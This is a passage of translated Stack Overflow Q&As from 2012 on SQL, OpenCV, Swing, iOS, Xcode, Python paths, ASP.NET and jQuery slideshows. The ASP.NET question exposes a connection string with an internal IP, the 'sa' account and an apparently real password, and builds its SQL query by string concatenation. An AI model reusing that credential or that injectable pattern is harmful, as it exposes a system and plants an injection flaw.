rem !!!!!!!!!!!!!!!!!!!!!!!

set activeProcessChain=%helpModule%,%importModul%

rem !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
rem Start Content Integration Testing Framework
rem !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Set count=0
For %%j in (%activeProcessChain%) Do Set /A count+=1

FOR /L %%H IN (1,1,%COUNT%) DO ( 

    call :loopThroughParams %%H
)
exit /b

:loopThroughParams
FOR /F "tokens=%1 delims=," %%I IN ("%activeProcessChain%") Do (

    echo.
    echo.
    java -jar %nameOfApplication% %%~I   
)
exit /b

:end 
```

# mysql - JIRA：过去 x（即 30）天的问题状态计数

> ID：12068700
> 
> 赞同：0
> 
> 时间：2012-08-22T07:59:42.340
> 
> 标签：mysql, sql, jira

通过下面的查询，我可以看到给定日期 JIRA 中所有 issueType 的问题计数（无）。

IE。

```
 SELECT count(*), STEP.STEP_ID
  FROM (SELECT STEP_ID, ENTRY_ID
  FROM OS_CURRENTSTEP
  WHERE OS_CURRENTSTEP.START_DATE < '<your date>'
  UNION SELECT STEP_ID, ENTRY_ID
  FROM OS_HISTORYSTEP
  WHERE OS_HISTORYSTEP.START_DATE < '<your date>'
  AND OS_HISTORYSTEP.FINISH_DATE > '<your date>' ) As STEP,
  (SELECT changeitem.OLDVALUE AS VAL, changegroup.ISSUEID AS ISSID
  FROM changegroup, changeitem
  WHERE changeitem.FIELD = 'Workflow'
  AND changeitem.GROUPID = changegroup.ID
  UNION SELECT jiraissue.WORKFLOW_ID AS VAL, jiraissue.id as ISSID
  FROM jiraissue) As VALID,
  jiraissue as JI
  WHERE STEP.ENTRY_ID = VALID.VAL
  AND VALID.ISSID = JI.id
 AND JI.project = <proj_id>
  Group By STEP.STEP_ID; 
```

结果是

```
Status   Count
open       12
closed      13
.....     .... 
```

我想要实现的实际上是这样的..每天打开和关闭状态的总数。

```
Date        COUNT(Open)      COUNT(Closed)
12-1-2012     12                 1
13-1-2012      14                5 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T15:25:21.703

一般的策略是这样的：

从一个月内所有天数的表中选择

LEFT OUTER JOIN 每天计数的表

（如果当天没有条目，则需要左外连接，您希望它显示零值）。

所以我认为这大致是您所需要的（不完整且日期函数语法对于您的数据库可能是错误的，但它会让您更接近）：

```
SELECT aDate
, COALESCE(SUM(CASE WHEN IssueStatus = 'whateverMeansOpen' THEN 1 END,0)) OpenCount
, COALESCE(SUM(CASE WHEN IssueStatus = 'whateverMeansClosed' THEN 1 END,0)) ClosedCount
FROM
(
    SELECT DATEADD(DAY, I, @START_DATE)  aDate
    FROM 
    (
        SELECT number AS I FROM [SomeTableWithAtLeast31Rows]
        where number between 1 and 31
    ) Numbers
    WHERE DATEADD(DAY, I, @START_DATE) < @END_DATE
) DateTimesInInterval 
LEFT OUTER JOIN
(
    Put your query here. It needs to output two columns, DateTimeOfIssue and IssueStatus
) yourHugeQuery ON yourHugeQuery.DateTimeOfIssue BETWEEN aDate and DATEADD(DAY, 1, aDate)
GROUP BY aDate
ORDER BY aDate 
```

# image - 从opencv中的浮点像素坐标重新映射图像

> ID：12068703
> 
> 赞同：1
> 
> 时间：2012-08-22T07:59:55.533
> 
> 标签：image, image-processing, opencv

我有一个带有浮点像素坐标的矩阵和这个浮点像素坐标中相应的灰度值矩阵。我需要将图像从浮点像素坐标重新映射到常规网格。opencv 的 cv::remap 函数像这样转换源图像： dst(x,y) = src(mapx(x,y), mapy(x,y)) 在我的情况下，我有这样的东西： dst(mapx (x,y), mapy(x,y)) = src(x,y) 根据上面的等式，我需要确定目标图像 (dst(x,y))。OpenCv 中是否有一种简单的方法来执行这种重新映射，或者你能推荐任何其他开源图像处理库来解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:16:16.247

*   拍摄照片的四个角。
*   在 dst 图像中提取它们的对应对象。将它们存储在两个点向量中：`std::vector<cv::Point> dstPts, srcPts`.
*   提取它们之间的几何关系`cv::findHomography(dstPts, srcPtrs,...)`
*   应用 cv::warpPerspective()。在内部，它计算并应用正确的重新映射

如果您的地图中定义的变换是单应变换，它就可以工作。如果是一些漩涡、鱼眼效果、镜头校正图等就不行了。

# java - JTable 列未出现

> ID：12068704
> 
> 赞同：1
> 
> 时间：2012-08-22T08:00:00.927
> 
> 标签：java, swing, jtable, jscrollpane, event-dispatching

我正在尝试在框架中显示一个简单的 jtable，但它没有显示表格的列，我按照 oracle 教程中的示例进行操作，但有些事情我做得不对。程序正在编译并运行。这是代码：

```
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.GridLayout;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.math.BigDecimal;
import java.math.RoundingMode;

public class SimpleTableDemo extends JPanel 
{

    SimpleTableDemo()
    {
        String[] columnNames = {"#",
                "Repayment Dates",
                "Principle Amount",
                "Interest",
                "Comission fee",
                "Total installement amount", 
                "Principle balance"};

//      BigDecimal bd = new BigDecimal(d).setScale(2, RoundingMode.HALF_EVEN);
        //each line of the two dimentional array is a line in the table
        Object[][] data = {
                {new Integer(1), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(2), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(3), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(4), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(5), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(6), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(7), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(8), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(9), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(10), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(11), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(12), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(13), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(14), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(15), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(16), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(17), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
                {new Integer(18), new java.util.Date(), new BigDecimal(12509.23).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(1571.77).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(0.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(14081.00).setScale(2, RoundingMode.HALF_EVEN), new BigDecimal(147490.77).setScale(2, RoundingMode.HALF_EVEN)},
            };

        JTable table = new JTable(data, columnNames);

//      JScrollPane scrollPane = new JScrollPane(table);
//      scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
//      scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);    
        table.setFillsViewportHeight(true);
        this.add(table);
    }

    public static void main(String[] args)
    {
        JFrame application = new JFrame();
        SimpleTableDemo panel = new SimpleTableDemo();
        application.add(panel);
        application.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
//      application.setSize(730,650);
        application.pack();
        application.setLocationRelativeTo(panel);
//      application.setResizable(false);
        application.setVisible(true);
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T08:03:33.583

`JTable`仅当位于 内时，表列才会自动显示`JScrollPane`。而不是`this.add(table);`，尝试`this.add(new JScrollPane(table));`

实际上，您似乎已经有一些与滚动窗格相关的代码 - 只需取消注释`JScrollPane scrollPane = new JScrollPane(table);`并更改`this.add(table);`为`this.add(scrollpane);`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T08:11:45.220

有一个`JScrollPane`总是有帮助的。您已经拥有以下代码：

```
JScrollPane scrollPane = new JScrollPane(table);
scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED); 
```

您需要做的就是将您的添加`JTable`到此`scrollpane`.

但是，我建议对用户界面的任何更新都发生在**事件调度线程**上。基本上，而不是这样：

```
 public static void main(String[] args)
    {
        JFrame application = new JFrame();
        SimpleTableDemo panel = new SimpleTableDemo();
        application.add(panel);
        application.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
//      application.setSize(730,650);
        application.pack();
        application.setLocationRelativeTo(panel);
//      application.setResizable(false);
        application.setVisible(true);
    } 
```

考虑：

```
public static void main(String[] args)
{
    java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                JFrame application = new JFrame();
                SimpleTableDemo panel = new SimpleTableDemo();
                application.add(panel);
                application.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            //      application.setSize(730,650);
                application.pack();
                application.setLocationRelativeTo(panel);
            //      application.setResizable(false);
                application.setVisible(true);
            }
        });
} 
```

[这篇文章](http://www.javamex.com/tutorials/threads/invokelater.shtml)可能会帮助你理解“Threading with Swing”的概念

# c# - 如何在 Windows Phone 7 上制作或创建后退按钮？

> ID：12068709
> 
> 赞同：-1
> 
> 时间：2012-08-22T08:00:10.527
> 
> 标签：c#, windows-phone-7, xaml

我已经做了一个应用程序，但是我的后退按钮有问题。按下时，它将用户返回到主页而不是上一页。

我该如何解决这个问题，以便后退按钮将用户带到*上一页*？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T09:05:33.193

设备上的后退按钮应该带您返回上一页，除非您已编写代码以在“OnBackKeyPressed”事件中的其他位置导航。如果您想返回某个其他事件的上一页，请尝试 NavigationService.GoBack()。

# iphone - 如何在 IBAction 中传递参数？

> ID：12068712
> 
> 赞同：1
> 
> 时间：2012-08-22T08:00:13.287
> 
> 标签：iphone, objective-c, cocoa, ibaction

我正在以编程方式访问 IBAction 并希望通过此 IBAction 调用传递两个参数。任何人都可以建议简单的方法...

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T08:05:02.490

IBActions 通常由用户界面元素调用，它们不能有任意数量的参数。

如果您想以编程方式调用 action 方法，您可以通过将字典作为参数传递来滥用 sender 参数，并保存您要传递的实际参数，如下所示：

```
- (void) foo
{
    [self myAction: [NSDictionary dictionaryWithObject: @"bar" forKey: @"baz"]];
} 
```

但是，我建议创建一个带有两个参数的附加方法；IBAction 可以使用适合发送者的参数调用它，并且您可以使用您需要的任何参数以编程方式调用它。这将是代码的可能大纲：

```
// The atual "logic" method, doing sth interesting
- (void) foo: (NSString *) s bar: (NSInteger) i
{
     // some code
}

- (IBAction) myAction: (id) sender
{
    // can be invoked by a button, or any view action
    if (sender == self.buttonX) {
        [self foo: @"x" bar: 42];
    }

    if (sender == self.buttonY) {
        [self foo: @"y" bar: 4];
    }
}

- (void) methodCallingFooBarProgrammatically
{
    [self foo: @"s" bar: 17];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:27:07.803

IBAction 方法也遵循特定的模式

```
- (IBAction)action:(id)sender; 
```

或者

```
- (IBAction)action:(id)sender forEvent:(UIEvent *)event; 
```

其中*sender*是发送事件的 UI 对象，而*event*是**UIEvent**本身。

如果您不发送这些参数，那么您不需要 IBAction 方法。定义一个接受你想要的两个参数的普通方法，如果你的 IBAction 方法也需要调用它，那么就这样做。IBAction 方法被定义为 IBAction 以便接口构建器可以在您的代码中找到它们，因此没有理由定义不遵循上述模式的 IBAction 方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:06:44.690

您可以像这样在 IBAction 方法中传递一个数组：

```
-(IBAction)method:(id)sender
{
   [sender objectAtIndex:0];
} 
```

或者你可以这样做：

```
-(IBAction)methodName:(NSString *)stringName:(NSString*)stringName2
{
  // You can pass an array and even a dictionary
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-22T08:34:26.817

IBAction 方法可以接收关于*发送者对象*和*触摸事件*的两个参数，你**不能**“传递”任何东西，你**只能**通过以下方式接收这些参数：

```
- (IBAction)action
- (IBAction)action:(id)sender
- (IBAction)action:(id)sender forEvent:(UIEvent *)event 
```

您可以仅使用发件人的`tag`属性将自定义标识符作为`NSInteger`.

* * *

# 这是重点

**您想要“传递”的所有其他内容必须已经存在于您的*模型*层上！**如果你知道它是什么...

因此，您可以在收到操作后从*模型层获取数据。*

# xcode - 如何在编辑器中更改 Xcode 4.4.1 的 3 指多点触控选择操作？

> ID：12068718
> 
> 赞同：2
> 
> 时间：2012-08-22T08:00:43.150
> 
> 标签：xcode, xcode4.4

当您在编辑器窗口中用 3 根手指向上/向下滑动时，Xcode 4.2 用于在头文件和 .m 文件之间切换。现在 excode 4.4.1 把它变成一个文本选择。有没有办法将默认行为更改为其他内容（在我的情况下，回到在 .h/.m 之间切换）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-29T02:33:17.373

我在 Xcode 4.4 中使用了 3 指滑动（我正在运行 Mountain Lion）。有可能的。尝试按照以下说明操作：[https](https://stackoverflow.com/a/7923619/472344) ://stackoverflow.com/a/7923619/472344 。

当我更新到 Lion 时，我已经使用这些来让 3 指轻扫在 Xcode 4.3 中工作。当我更新到 Xcode 4.4 和 Mountain Lion 时，它似乎崩溃了。我再次完成了所有步骤，但这次所有设置都已正确设置，因此我无需更改任何内容。但是，现在它对我有用。试一试。

您还可以使用 ctrl+command+UpArrow（或 DownArrow）在 .h 和 .m 之间切换。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:09:22.347

我不知道是否有办法在 Xcode 中更改手势，但通常我发现如果我先打开 .h，然后打开 .m（或相反）然后你可以用 2 个手指左右滑动它们:)

只要您在中心而不是在新窗口中打开它们=]

# python - 如何快速切换 python 2 和 3？

> ID：12068723
> 
> 赞同：1
> 
> 时间：2012-08-22T08:01:03.113
> 
> 标签：python, windows-7

我需要同时使用 python 2 和 python 3。

更改打开 .py 文件时使用的默认 python 的唯一方法是更改​​ PATH 环境变量。步骤很麻烦。

我可以有一些 Windows 批处理脚本来为我修改 PATH 变量吗？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:45:20.883

是的，通过批处理脚本修改 PATH：

这将启动 Python2：

```
C:\> set PATH=C:\Python27\;%PATH%
C:\> python.exe 
```

这将启动 Python3：

```
C:\> set PATH=C:\Python32\;%PATH%
C:\> python.exe 
```

*（请注意，更改后的 PATH 仅对您当前的命令 shell 会话有效）*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-22T18:32:03.443

我有一个简单的方法来切换。在 C:> 中安装 python27 和 python33。然后会有两个文件夹python27和python33。默认设置系统路径为python27。如果要使用 python33，请将 python27 文件夹名称更改为 python27_274 并将 python33 文件夹名称更改为 python27 :)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:23:14.993

您可以使用 regedit 从`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment`.

这样您就可以创建两个 reg 文件：一个在路径中包含 python2，另一个在路径中包含 python3。双击相应的文件将相应地更改路径。

# java - Path2D 上的鼠标指针检测

> ID：12068726
> 
> 赞同：7
> 
> 时间：2012-08-22T08:01:33.250
> 
> 标签：java, shape, java-2d, path-2d

我构造了一个[`Path2D`](http://docs.oracle.com/javase/7/docs/api/java/awt/geom/Path2D.html)表示由直线组成的未闭合形状：

![在此处输入图像描述](../Images/c8082743176b4437ea02ce223e5449c1.png)

我希望能够检测何时单击鼠标并且鼠标指针靠近路径（在几个像素内）。使用该[`contains`](http://docs.oracle.com/javase/7/docs/api/java/awt/geom/Path2D.html#contains%28double,%20double%29)方法不起作用，因为该算法将未闭合的形状视为隐式闭合（即通过在起点和终点之间绘制一条直线）。

有谁知道实现这一目标的另一种机制？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-22T09:03:05.610

1.  创建一个 BasicStroke（宽度控制您的像素距离容差）
2.  不要用它绘制，只使用它的 createStrokedShape 方法从您的形状创建第二个形状。如果您使用 BasicStroke 绘制第一个形状，则第二个形状描述了将要填充的形状的轮廓。
3.  使用第二个形状的 contains 方法

来自 Stroke.createStrokedShape API 文档：

> 根据实现 Stroke 接口的对象定义的规则，返回一个轮廓形状，该形状包含在描边形状时应绘制的区域。

# asp.net - 从 sql bug 填充下拉列表

> ID：12068729
> 
> 赞同：1
> 
> 时间：2012-08-22T08:01:51.817
> 
> 标签：asp.net, vb.net

下午好，人们一直在尝试使用 sql 命令填充下拉列表，直到非常好，当我单击下拉列表时，它会显示所有项目，但是当我尝试单击下拉列表中的某个项目时，它总是返回第一个项目下拉列表....遵循代码，我想要做的是从下拉列表中获取选定的值和项目并将其保存在标签上以备将来使用。

我感谢所有可能的支持，

```
Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
    utilizador.Text = Me.Context.User.Identity.Name
    If (Not Page.IsPostBack) Then
        escolhePerfil()
    End If

    'DropDownPerfil.DataBind()
    lbperfil2.Text = DropDownPerfil.SelectedItem.Text
    lbnome.Text = DropDownPerfil.SelectedValue
End Sub

Function escolhePerfil() As Boolean
    Dim connstring As String = "Data Source=10.2.24.17;Persist Security Info=True;User ID=sa;Password=Pr0dUn1C0$qL;database=ePrimavera"
    Dim SQLData As New System.Data.SqlClient.SqlConnection(connstring)

    Dim cmdSelect As New System.Data.SqlClient.SqlCommand("SELECT  u.WindowsUser,u.Email ,g.Description, u.Login FROM [ePrimavera].[dbo].[PLT_Users] as  u,[ePrimavera].[dbo].[PLT_UserGroups] as ug, [ePrimavera].[dbo].[PLT_Groups] as g where u.ID = ug.UserID And ug.GroupID = g.ID and u.WindowsUser like 'bancounico\" & utilizador.Text & "'", SQLData)
    SQLData.Open()

    Dim dtrReader As System.Data.SqlClient.SqlDataReader = cmdSelect.ExecuteReader()

    If dtrReader.HasRows Then
        DropDownPerfil.DataValueField = "Login"
        DropDownPerfil.DataTextField = "Description"
        DropDownPerfil.DataSource = dtrReader
        DropDownPerfil.DataBind()
    End If
    SQLData.Close()

    Return True
End Function 
```

.aspx

```
 <asp:DropDownList ID="DropDownPerfil" runat="server" 
      Height="16px" Width="202px" CssClass="DropBorderColor">
 </asp:DropDownList> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:10:01.493

试试下面的代码：

```
Protected Sub DropDownPerfil_SelectedIndexChanged(sender As Object, e As EventArgs)
        lbperfil2.Text = DropDownPerfil.SelectedItem.Text
        lbnome.Text = DropDownPerfil.SelectedValue
    End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:27:56.723

问题是您试图“过早”获得价值。该值在 Page_Load 中无效，因为控件的 OnLoad 事件在 Page 的 OnLoad (Page_Load) 事件之后触发。

方式，其他人写的正确，因为事件处理部分（包括控件的 onchanged 事件）将在加载部分之后处理。

有关更多详细信息，请查看MSDN 中的官方[ASP.NET 生命周期站点](http://msdn.microsoft.com/en-us/library/ms178472%28v=vs.100%29.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T10:26:15.850

可能的原因是您分配给 DropDownList 的某些（如果不是全部）值`Login`多次出现。

然后，当您在 DDL 中选择一个项目时，如果该项目的值多次出现，则所选索引将突出显示第一个实例。要对此进行测试，请注释掉`DropDownPerfil.DataValueField = "Login"`

我确信在选择时，它会突出显示您打算选择的正确项目。

# jquery - jquery简单图片幻灯片教程

> ID：12068734
> 
> 赞同：36
> 
> 时间：2012-08-22T08:02:33.190
> 
> 标签：jquery, image, slideshow

我在哪里可以找到一个简单的 jquery 图像幻灯片教程，适合初学者从头开始（没有插件），没有左右导航按钮？

谢谢你。

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2013-05-21T22:15:47.140

这是迄今为止我在网上找到的最简单的例子。 [http://jonraasch.com/blog/a-simple-jquery-slideshow](http://jonraasch.com/blog/a-simple-jquery-slideshow)

总结这个例子，这就是你需要做一个幻灯片：

**HTML：**

```
<div id="slideshow">
    <img src="img1.jpg" style="position:absolute;" class="active" />
    <img src="img2.jpg" style="position:absolute;" />
    <img src="img3.jpg" style="position:absolute;" />
</div> 
```

绝对位置用于将每个图像放在另一个图像上。

**CSS**

```
<style type="text/css">
    .active{
        z-index:99;
    }
</style> 
```

具有 class="active" 的图像将出现在其他图像之上，class=active 属性将随着以下**Jquery**代码而改变。

```
<script>
    function slideSwitch() {
        var $active = $('div#slideshow IMG.active');
        var $next = $active.next();    

        $next.addClass('active');

        $active.removeClass('active');
    }

    $(function() {
        setInterval( "slideSwitch()", 5000 );
    });
</script> 
```

如果您想进一步了解幻灯片，我建议您查看上面的链接（查看动画不透明度更改 - 2n 示例）或其他更复杂的幻灯片教程。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2013-08-28T16:43:00.620

我不知道您为什么没有标记这些 gr8 答案...这是另一个选项，可以让您和其他任何访问者控制转换速度和暂停时间

**JAVASCRIPT**

```
$(function () {

    /* SET PARAMETERS */
    var change_img_time     = 5000; 
    var transition_speed    = 100;

    var simple_slideshow    = $("#exampleSlider"),
        listItems           = simple_slideshow.children('li'),
        listLen             = listItems.length,
        i                   = 0,

        changeList = function () {

            listItems.eq(i).fadeOut(transition_speed, function () {
                i += 1;
                if (i === listLen) {
                    i = 0;
                }
                listItems.eq(i).fadeIn(transition_speed);
            });

        };

    listItems.not(':first').hide();
    setInterval(changeList, change_img_time);

}); 
```

.

**HTML**

```
<ul id="exampleSlider">
    <li><img src="http://placehold.it/500x250" alt="" /></li>
    <li><img src="http://placehold.it/500x250" alt="" /></li>
    <li><img src="http://placehold.it/500x250" alt="" /></li>
    <li><img src="http://placehold.it/500x250" alt="" /></li>
</ul> 
```

.
如果你保持这个简单，那么它很容易保持响应
最好访问：[DEMO](http://jsfiddle.net/sagive/cAsB3/)

.
如果你想要一些带有特殊过渡效果的东西（仍然响应） - 看看这个
[DEMO WITH SPECIAL FX](http://jsfiddle.net/7w9351tb/142/)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-04-03T23:43:15.320

这是我对 Michael Soriano 教程的改编。见下文或在[JSBin](https://jsbin.com/xecowoq/edit?html,css,js,output)中。

```
$(function() {
  var theImage = $('ul#ss li img');
  var theWidth = theImage.width();
  //wrap into mother div
  $('ul#ss').wrap('<div id="mother" />');
  //assign height width and overflow hidden to mother
  $('#mother').css({
    width: function() {
      return theWidth;
    },
    height: function() {
      return theImage.height();
    },
    position: 'relative',
    overflow: 'hidden'
  });
  //get total of image sizes and set as width for ul 
  var totalWidth = theImage.length * theWidth;
  $('ul').css({
    width: function() {
      return totalWidth;
    }
  });

  var ss_timer = setInterval(function() {
    ss_next();
  }, 3000);

  function ss_next() {
    var a = $(".active");
    a.removeClass('active');

    if (a.hasClass('last')) {
      //last element -- loop
      a.parent('ul').animate({
        "margin-left": (0)
      }, 1000);
      a.siblings(":first").addClass('active');
    } else {
      a.parent('ul').animate({
        "margin-left": (-(a.index() + 1) * theWidth)
      }, 1000);
      a.next().addClass('active');
    }
  }

  // Cancel slideshow and move next manually on click
  $('ul#ss li img').on('click', function() {
    clearInterval(ss_timer);
    ss_next();
  });

});
```

```
* {
  margin: 0;
  padding: 0;
}
#ss {
  list-style: none;
}
#ss li {
  float: left;
}
#ss img {
  width: 200px;
  height: 100px;
}
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<ul id="ss">
  <li class="active">
    <img src="http://leemark.github.io/better-simple-slideshow/demo/img/colorado-colors.jpg">
  </li>
  <li>
    <img src="http://leemark.github.io/better-simple-slideshow/demo/img/monte-vista.jpg">
  </li>
  <li class="last">
    <img src="http://leemark.github.io/better-simple-slideshow/demo/img/colorado.jpg">
  </li>
</ul>
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-22T08:07:15.127

这看起来像你会感兴趣的东西

[http://www.designchemical.com/blog/index.php/jquery/jquery-image-swap-gallery/](http://www.designchemical.com/blog/index.php/jquery/jquery-image-swap-gallery/)

# android - 空间不足时使用替代布局

> ID：12068735
> 
> 赞同：1
> 
